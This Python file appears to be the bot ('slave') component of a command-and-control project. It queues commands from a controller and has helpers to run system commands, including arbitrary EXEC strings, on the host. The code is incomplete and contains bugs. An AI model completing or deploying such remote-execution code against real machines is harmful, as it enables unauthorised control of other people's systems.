from threading import Thread
import subprocess
from typing import Dict

from common.data.commands import CommandExecutionRequest, CommandExecutionResult, CommandTypes, CommandStatus
from slave.src.data.context import get_new_commands_arrived_condition, \
    get_commands_from_queue, get_bot_id

__COMMANDS_EXECUTABLE_BY_SUBPROCESS: Dict[CommandTypes, str] = {CommandTypes.W: "w",
                                                                CommandTypes.LS: "ls",
                                                                CommandTypes.ID: "id"}


def __execute_command_as_subprocess(command: str, param: str) -> CommandExecutionResult:
    result = subprocess.run([command, param], capture_output=True, text=True)
    if result.stderr != "":
        return CommandExecutionResult(bot_id=get_bot_id(), command=CommandTypes.W, param="",
                                      status=CommandStatus.ERROR, results=[result.stderr])

    return CommandExecutionResult(bot_id=get_bot_id(), command=CommandTypes.W, param="",
                                  status=CommandStatus.SUCCESS, results=[result.stdout])


def __execute_command(command: CommandExecutionRequest) -> CommandExecutionResult:
    if command.command in __COMMANDS_EXECUTABLE_BY_SUBPROCESS:
        return __execute_command_as_subprocess(__COMMANDS_EXECUTABLE_BY_SUBPROCESS[command.command], command.param)
    elif command.command == CommandTypes.EXEC:
        return __execute_command_as_subprocess(command.param, "")
    elif command.command == CommandTypes.COPY:
        pass
    raise AssertionError("Unreachable state reached")


def __handle_commands() -> None:
    while True:
        with get_new_commands_arrived_condition():
            get_new_commands_arrived_condition().wait()
        command_queue = get_commands_from_queue()
        for command in command_queue:
            print(command)


def start_executor_job() -> Thread:
    thread = Thread(target=__handle_commands)
    thread.start()
    return thread
